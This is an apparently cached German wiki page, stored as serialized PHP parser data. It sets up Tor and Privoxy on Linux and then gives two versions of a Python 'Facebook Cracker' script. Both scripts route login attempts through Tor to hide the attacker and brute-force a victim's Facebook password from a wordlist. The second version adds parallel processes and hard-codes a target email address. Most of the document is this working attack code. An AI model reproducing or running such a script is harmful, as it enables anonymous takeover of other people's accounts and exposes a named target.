a:39:{i:0;a:3:{i:0;s:14:"document_start";i:1;a:0:{}i:2;i:0;}i:1;a:3:{i:0;s:6:"p_open";i:1;a:0:{}i:2;i:0;}i:2;a:3:{i:0;s:5:"cdata";i:1;a:1:{i:0;s:18:"Tor installieren 
";}i:2;i:1;}i:3;a:3:{i:0;s:6:"plugin";i:1;a:4:{i:0;s:9:"code_code";i:1;a:4:{i:0;s:4:"code";i:1;N;i:2;s:0:"";i:3;s:19:"apt-get install tor";}i:2;i:3;i:3;s:20:">apt-get install tor";}i:2;i:24;}i:4;a:3:{i:0;s:7:"p_close";i:1;a:0:{}i:2;i:51;}i:5;a:3:{i:0;s:6:"p_open";i:1;a:0:{}i:2;i:51;}i:6;a:3:{i:0;s:5:"cdata";i:1;a:1:{i:0;s:25:"password hash erstellen 
";}i:2;i:53;}i:7;a:3:{i:0;s:6:"plugin";i:1;a:4:{i:0;s:9:"code_code";i:1;a:4:{i:0;s:4:"code";i:1;N;i:2;s:0:"";i:3;s:30:"tor --hash-password mypassword";}i:2;i:3;i:3;s:31:">tor --hash-password mypassword";}i:2;i:83;}i:8;a:3:{i:0;s:7:"p_close";i:1;a:0:{}i:2;i:121;}i:9;a:3:{i:0;s:6:"p_open";i:1;a:0:{}i:2;i:121;}i:10;a:3:{i:0;s:5:"cdata";i:1;a:1:{i:0;s:33:"Datei anpassen /etc/tor/torrc : 
";}i:2;i:123;}i:11;a:3:{i:0;s:6:"plugin";i:1;a:4:{i:0;s:9:"code_code";i:1;a:4:{i:0;s:4:"code";i:1;N;i:2;s:0:"";i:3;s:109:" 
ControlPort 9051
HashedControlPassword 16:872860B76453A77D60CA2BB8C1A7042072093276A3D701AD684053EC4C<code>
";}i:2;i:3;i:3;s:110:"> 
ControlPort 9051
HashedControlPassword 16:872860B76453A77D60CA2BB8C1A7042072093276A3D701AD684053EC4C<code>
";}i:2;i:161;}i:12;a:3:{i:0;s:5:"cdata";i:1;a:1:{i:0;s:42:"
Git,Python-dev und pytorctl installieren ";}i:2;i:278;}i:13;a:3:{i:0;s:7:"p_close";i:1;a:0:{}i:2;i:320;}i:14;a:3:{i:0;s:6:"p_open";i:1;a:0:{}i:2;i:320;}i:15;a:3:{i:0;s:6:"plugin";i:1;a:4:{i:0;s:9:"code_code";i:1;a:4:{i:0;s:4:"code";i:1;N;i:2;s:0:"";i:3;s:151:"
apt-get install git
apt-get install python-dev python-pip
#git clone git://github.com/aaronsw/pytorctl.git
#pip install pytorctl/
pip install PySocks
";}i:2;i:3;i:3;s:152:">
apt-get install git
apt-get install python-dev python-pip
#git clone git://github.com/aaronsw/pytorctl.git
#pip install pytorctl/
pip install PySocks
";}i:2;i:327;}i:16;a:3:{i:0;s:7:"p_close";i:1;a:0:{}i:2;i:486;}i:17;a:3:{i:0;s:6:"p_open";i:1;a:0:{}i:2;i:486;}i:18;a:3:{i:0;s:5:"cdata";i:1;a:1:{i:0;s:24:"Privoxy installieren : 
";}i:2;i:488;}i:19;a:3:{i:0;s:6:"plugin";i:1;a:4:{i:0;s:9:"code_code";i:1;a:4:{i:0;s:4:"code";i:1;N;i:2;s:0:"";i:3;s:23:"apt-get install privoxy";}i:2;i:3;i:3;s:24:">apt-get install privoxy";}i:2;i:517;}i:20;a:3:{i:0;s:7:"p_close";i:1;a:0:{}i:2;i:548;}i:21;a:3:{i:0;s:6:"p_open";i:1;a:0:{}i:2;i:548;}i:22;a:3:{i:0;s:5:"cdata";i:1;a:1:{i:0;s:42:"Datei konfigurieren /etc/privoxy/config  
";}i:2;i:550;}i:23;a:3:{i:0;s:6:"plugin";i:1;a:4:{i:0;s:9:"code_code";i:1;a:4:{i:0;s:4:"code";i:1;N;i:2;s:0:"";i:3;s:33:"forward-socks5 / localhost:9050 .";}i:2;i:3;i:3;s:34:">forward-socks5 / localhost:9050 .";}i:2;i:597;}i:24;a:3:{i:0;s:7:"p_close";i:1;a:0:{}i:2;i:638;}i:25;a:3:{i:0;s:6:"p_open";i:1;a:0:{}i:2;i:638;}i:26;a:3:{i:0;s:5:"cdata";i:1;a:1:{i:0;s:35:"Python Script run in Tor Beispiel 
";}i:2;i:640;}i:27;a:3:{i:0;s:6:"plugin";i:1;a:4:{i:0;s:9:"code_code";i:1;a:4:{i:0;s:4:"code";i:1;s:6:"python";i:2;s:0:"";i:3;s:408:"
import urllib2
import urllib
import json
import socket
import socks
ipcheck_url = 'http://checkip.amazonaws.com/'
# Actual IP.
print urllib2.urlopen(ipcheck_url).read() 
# Tor IP.
socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)
socket.socket = socks.socksocket
print urllib2.urlopen(ipcheck_url).read() 
data = json.loads(urllib.urlopen("http://ip.jsontest.com/").read())
print data["ip"]
";}i:2;i:3;i:3;s:416:" python>
import urllib2
import urllib
import json
import socket
import socks
ipcheck_url = 'http://checkip.amazonaws.com/'
# Actual IP.
print urllib2.urlopen(ipcheck_url).read() 
# Tor IP.
socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)
socket.socket = socks.socksocket
print urllib2.urlopen(ipcheck_url).read() 
data = json.loads(urllib.urlopen("http://ip.jsontest.com/").read())
print data["ip"]
";}i:2;i:680;}i:28;a:3:{i:0;s:7:"p_close";i:1;a:0:{}i:2;i:1103;}i:29;a:3:{i:0;s:6:"p_open";i:1;a:0:{}i:2;i:1103;}i:30;a:3:{i:0;s:5:"cdata";i:1;a:1:{i:0;s:31:"Bruteforce Skript mit Tor IP : ";}i:2;i:1106;}i:31;a:3:{i:0;s:7:"p_close";i:1;a:0:{}i:2;i:1137;}i:32;a:3:{i:0;s:6:"p_open";i:1;a:0:{}i:2;i:1137;}i:33;a:3:{i:0;s:6:"plugin";i:1;a:4:{i:0;s:9:"code_code";i:1;a:4:{i:0;s:4:"code";i:1;s:6:"python";i:2;s:0:"";i:3;s:4099:"
import urllib2
import urllib
import json
import socket
import socks

import sys
import random
import mechanize
import cookielib

ipcheck_url = 'http://checkip.amazonaws.com/'
# Actual IP.
print "That is the Reail WAN IP :" + urllib2.urlopen(ipcheck_url).read() 
# Tor IP.
socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)
socket.socket = socks.socksocket
print "That is the Attack Tor IP :" + urllib2.urlopen(ipcheck_url).read() 

#data = json.loads(urllib.urlopen("http://ip.jsontest.com/").read())
#print data["ip"]

#----------------------------------------------------------------------------------------


GHT = '''
        +=======================================+
        |..........Facebook Cracker v 2.........|
        +---------------------------------------+
        |#Author: Mauritania Attacker           |
        |#Contact: www.fb.com/mauritanie.forever|
        |#Date: 02/04/2013                      |
        |#Modify: JonnyBravo Date:09/08/2016    |
        |#This tool is made for pentesting.     |
        |#Changing the Description of this tool |
        |Won't made you the coder ^_^ !!!       |
        |#Respect Coderz ^_^                    |
        |#I take no responsibilities for the    |
        |  use of this program !                |
        +=======================================+
        |..........Facebook Cracker v 2.........|
        +---------------------------------------+
'''
print "Note: - This tool can crack facebook account even if you don't have the email of your victim"
print "# Hit CTRL+C to quit the program"
print "# Use www.graph.facebook.com for more infos about your victim ^_^"
email = str(raw_input("# Enter |Email| |Phone number| |Profile ID number| |Username| : "))
passwordlist = str(raw_input("Enter the name of the password list file : "))
useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
login = 'https://www.facebook.com/login.php?login_attempt=1&lwv=100'
def attack(password):
  try:
     sys.stdout.write("\r[*] trying %s.. " % password)
     sys.stdout.flush()
     br.addheaders = [('User-agent', random.choice(useragents))]
     site = br.open(login)
     br.select_form(nr=0)
     print "cHECK " +  password 
     ##Facebook
     br.form['email'] = email
     br.form['pass'] = password
     br.submit()
     log = br.geturl()
    # print log
    # print login
     if log != login:
        print "\n\n\n [*] Password found .. !!"
        print "\n [*] Password : %s\n" % (password)
        sys.exit(1)
  except KeyboardInterrupt:
        print "\n[*] Exiting program .. "
        sys.exit(1)
def search():
    global password
    for password in passwords:
        attack(password.replace("\n",""))
def check():
    global br
    global passwords
    try:
       br = mechanize.Browser()
       cj = cookielib.LWPCookieJar()
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_cookiejar(cj)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:
       print "\n[*] Exiting program ..\n"
       sys.exit(1)
    try:
       list = open(passwordlist, "r")
       passwords = list.readlines()
       k = 0
       while k < len(passwords):
          passwords[k] = passwords[k].strip()
          k += 1
    except IOError:
        print "\n [*] Error: check your password list path \n"
        sys.exit(1)
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
    try:
        print GHT
        print " [*] Account to crack : %s" % (email)
        print " [*] Loaded :" , len(passwords), "passwords"
        print " [*] Cracking, please wait ..."
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
    try:
        search()
        attack(password)
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
if __name__ == '__main__':
    check()
";}i:2;i:3;i:3;s:4107:" python>
import urllib2
import urllib
import json
import socket
import socks

import sys
import random
import mechanize
import cookielib

ipcheck_url = 'http://checkip.amazonaws.com/'
# Actual IP.
print "That is the Reail WAN IP :" + urllib2.urlopen(ipcheck_url).read() 
# Tor IP.
socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)
socket.socket = socks.socksocket
print "That is the Attack Tor IP :" + urllib2.urlopen(ipcheck_url).read() 

#data = json.loads(urllib.urlopen("http://ip.jsontest.com/").read())
#print data["ip"]

#----------------------------------------------------------------------------------------


GHT = '''
        +=======================================+
        |..........Facebook Cracker v 2.........|
        +---------------------------------------+
        |#Author: Mauritania Attacker           |
        |#Contact: www.fb.com/mauritanie.forever|
        |#Date: 02/04/2013                      |
        |#Modify: JonnyBravo Date:09/08/2016    |
        |#This tool is made for pentesting.     |
        |#Changing the Description of this tool |
        |Won't made you the coder ^_^ !!!       |
        |#Respect Coderz ^_^                    |
        |#I take no responsibilities for the    |
        |  use of this program !                |
        +=======================================+
        |..........Facebook Cracker v 2.........|
        +---------------------------------------+
'''
print "Note: - This tool can crack facebook account even if you don't have the email of your victim"
print "# Hit CTRL+C to quit the program"
print "# Use www.graph.facebook.com for more infos about your victim ^_^"
email = str(raw_input("# Enter |Email| |Phone number| |Profile ID number| |Username| : "))
passwordlist = str(raw_input("Enter the name of the password list file : "))
useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
login = 'https://www.facebook.com/login.php?login_attempt=1&lwv=100'
def attack(password):
  try:
     sys.stdout.write("\r[*] trying %s.. " % password)
     sys.stdout.flush()
     br.addheaders = [('User-agent', random.choice(useragents))]
     site = br.open(login)
     br.select_form(nr=0)
     print "cHECK " +  password 
     ##Facebook
     br.form['email'] = email
     br.form['pass'] = password
     br.submit()
     log = br.geturl()
    # print log
    # print login
     if log != login:
        print "\n\n\n [*] Password found .. !!"
        print "\n [*] Password : %s\n" % (password)
        sys.exit(1)
  except KeyboardInterrupt:
        print "\n[*] Exiting program .. "
        sys.exit(1)
def search():
    global password
    for password in passwords:
        attack(password.replace("\n",""))
def check():
    global br
    global passwords
    try:
       br = mechanize.Browser()
       cj = cookielib.LWPCookieJar()
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_cookiejar(cj)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:
       print "\n[*] Exiting program ..\n"
       sys.exit(1)
    try:
       list = open(passwordlist, "r")
       passwords = list.readlines()
       k = 0
       while k < len(passwords):
          passwords[k] = passwords[k].strip()
          k += 1
    except IOError:
        print "\n [*] Error: check your password list path \n"
        sys.exit(1)
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
    try:
        print GHT
        print " [*] Account to crack : %s" % (email)
        print " [*] Loaded :" , len(passwords), "passwords"
        print " [*] Cracking, please wait ..."
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
    try:
        search()
        attack(password)
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
if __name__ == '__main__':
    check()
";}i:2;i:1144;}i:34;a:3:{i:0;s:7:"p_close";i:1;a:0:{}i:2;i:5258;}i:35;a:3:{i:0;s:6:"p_open";i:1;a:0:{}i:2;i:5258;}i:36;a:3:{i:0;s:6:"plugin";i:1;a:4:{i:0;s:9:"code_code";i:1;a:4:{i:0;s:4:"code";i:1;s:6:"python";i:2;s:0:"";i:3;s:4781:"
import urllib2
import urllib
import json
import socket
import socks
import time
import sys
import random
import mechanize
import cookielib

import threading
#from multiprocessing import Process, Array, Queue, Pool 
import multiprocessing
import ctypes
import numpy as np


ipcheck_url = 'http://checkip.amazonaws.com/'
# Actual IP.
print "That is the Reail WAN IP :" + urllib2.urlopen(ipcheck_url).read() 
# Tor IP.
socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)
socket.socket = socks.socksocket
print "That is the Attack Tor IP :" + urllib2.urlopen(ipcheck_url).read() 

#data = json.loads(urllib.urlopen("http://ip.jsontest.com/").read())
#print data["ip"]
#----------------------------------------------------------------------------------------


GHT = '''
        +=======================================+
        |..........Facebook Cracker v 2.........|
        +---------------------------------------+
        |#Author: Mauritania Attacker           |
        |#Contact: www.fb.com/mauritanie.forever|
        |#Date: 02/04/2013                      |
        |#Modify: JonnyBravo Date:09/08/2016    |
        |#This tool is made for pentesting.     |
        |#Changing the Description of this tool |
        |Won't made you the coder ^_^ !!!       |
        |#Respect Coderz ^_^                    |
        |#I take no responsibilities for the    |
        |  use of this program !                |
        +=======================================+
        |..........Facebook Cracker v 2.........|
        +---------------------------------------+
'''
print "Note: - This tool can crack facebook account even if you don't have the email of your victim"
print "# Hit CTRL+C to quit the program"
print "# Use www.graph.facebook.com for more infos about your victim ^_^"
#email = str(raw_input("# Enter |Email| |Phone number| |Profile ID number| |Username| : "))
email = "mr.blue82@gmail.com"
#passwordlist = str(raw_input("Enter the name of the password list file : "))
passwordlist = "/home/jonnybravo/Test"
useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
login = 'https://www.facebook.com/login.php?login_attempt=1&lwv=100'
result_list = []
def log_result(result):
	print "ja"
	result_list.append(result)

def attack(password):
  try:
     sys.stdout.write("\r[*] trying %s.. " % password)
     #sys.stdout.flush()
     br.addheaders = [('User-agent', random.choice(useragents))]
     site = br.open(login)
     br.select_form(nr=0)
     #print "cHECK " +  password 
     ##Facebook 
     br.form['email'] = email
     br.form['pass'] = password
     br.submit()
     log = br.geturl()
     #print log
     #print login
     if log != login:
        print "\n\n\n [*] Password found .. !!"
        print "\n [*] Password : %s\n" % (password)
        return "Yes"
        sys.exit(3)
     time.sleep(1.0)
     return "No"
     
        
  except KeyboardInterrupt:
        print "\n[*] Exiting program .. "
        
        sys.exit(1)

        
def search():
    global password
    test = []
    for password in passwords:
		#Muliti
		test.append(password.replace("\n",""))
        #attack(password.replace("\n",""))
    #print "Output LIst ", test
    pool = multiprocessing.Pool(processes=3)
    pool.map_async(attack, test, callback = log_result)
    pool.close()
    pool.join() 
     
    #print "lol", result_list


    #p.join()
    
def check():
    global br
    global passwords
    try:
       br = mechanize.Browser()
       cj = cookielib.LWPCookieJar()
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_cookiejar(cj)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:
       print "\n[*] Exiting program ..\n"
       sys.exit(1)
    try:
       list = open(passwordlist, "r")
       passwords = list.readlines()
       k = 0
       while k < len(passwords):
          passwords[k] = passwords[k].strip()
          k += 1
    except IOError:
        print "\n [*] Error: check your password list path \n"
        sys.exit(1)
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
    try:
        print GHT
        print " [*] Account to crack : %s" % (email)
        print " [*] Loaded :" , len(passwords), "passwords"
        print " [*] Cracking, please wait ..."
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
    try:
        search()
        attack(password)
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
if __name__ == '__main__':
    check()
";}i:2;i:3;i:3;s:4789:" python>
import urllib2
import urllib
import json
import socket
import socks
import time
import sys
import random
import mechanize
import cookielib

import threading
#from multiprocessing import Process, Array, Queue, Pool 
import multiprocessing
import ctypes
import numpy as np


ipcheck_url = 'http://checkip.amazonaws.com/'
# Actual IP.
print "That is the Reail WAN IP :" + urllib2.urlopen(ipcheck_url).read() 
# Tor IP.
socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)
socket.socket = socks.socksocket
print "That is the Attack Tor IP :" + urllib2.urlopen(ipcheck_url).read() 

#data = json.loads(urllib.urlopen("http://ip.jsontest.com/").read())
#print data["ip"]
#----------------------------------------------------------------------------------------


GHT = '''
        +=======================================+
        |..........Facebook Cracker v 2.........|
        +---------------------------------------+
        |#Author: Mauritania Attacker           |
        |#Contact: www.fb.com/mauritanie.forever|
        |#Date: 02/04/2013                      |
        |#Modify: JonnyBravo Date:09/08/2016    |
        |#This tool is made for pentesting.     |
        |#Changing the Description of this tool |
        |Won't made you the coder ^_^ !!!       |
        |#Respect Coderz ^_^                    |
        |#I take no responsibilities for the    |
        |  use of this program !                |
        +=======================================+
        |..........Facebook Cracker v 2.........|
        +---------------------------------------+
'''
print "Note: - This tool can crack facebook account even if you don't have the email of your victim"
print "# Hit CTRL+C to quit the program"
print "# Use www.graph.facebook.com for more infos about your victim ^_^"
#email = str(raw_input("# Enter |Email| |Phone number| |Profile ID number| |Username| : "))
email = "mr.blue82@gmail.com"
#passwordlist = str(raw_input("Enter the name of the password list file : "))
passwordlist = "/home/jonnybravo/Test"
useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
login = 'https://www.facebook.com/login.php?login_attempt=1&lwv=100'
result_list = []
def log_result(result):
	print "ja"
	result_list.append(result)

def attack(password):
  try:
     sys.stdout.write("\r[*] trying %s.. " % password)
     #sys.stdout.flush()
     br.addheaders = [('User-agent', random.choice(useragents))]
     site = br.open(login)
     br.select_form(nr=0)
     #print "cHECK " +  password 
     ##Facebook 
     br.form['email'] = email
     br.form['pass'] = password
     br.submit()
     log = br.geturl()
     #print log
     #print login
     if log != login:
        print "\n\n\n [*] Password found .. !!"
        print "\n [*] Password : %s\n" % (password)
        return "Yes"
        sys.exit(3)
     time.sleep(1.0)
     return "No"
     
        
  except KeyboardInterrupt:
        print "\n[*] Exiting program .. "
        
        sys.exit(1)

        
def search():
    global password
    test = []
    for password in passwords:
		#Muliti
		test.append(password.replace("\n",""))
        #attack(password.replace("\n",""))
    #print "Output LIst ", test
    pool = multiprocessing.Pool(processes=3)
    pool.map_async(attack, test, callback = log_result)
    pool.close()
    pool.join() 
     
    #print "lol", result_list


    #p.join()
    
def check():
    global br
    global passwords
    try:
       br = mechanize.Browser()
       cj = cookielib.LWPCookieJar()
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_cookiejar(cj)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:
       print "\n[*] Exiting program ..\n"
       sys.exit(1)
    try:
       list = open(passwordlist, "r")
       passwords = list.readlines()
       k = 0
       while k < len(passwords):
          passwords[k] = passwords[k].strip()
          k += 1
    except IOError:
        print "\n [*] Error: check your password list path \n"
        sys.exit(1)
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
    try:
        print GHT
        print " [*] Account to crack : %s" % (email)
        print " [*] Loaded :" , len(passwords), "passwords"
        print " [*] Cracking, please wait ..."
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
    try:
        search()
        attack(password)
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
if __name__ == '__main__':
    check()
";}i:2;i:5265;}i:37;a:3:{i:0;s:7:"p_close";i:1;a:0:{}i:2;i:10061;}i:38;a:3:{i:0;s:12:"document_end";i:1;a:0:{}i:2;i:10061;}}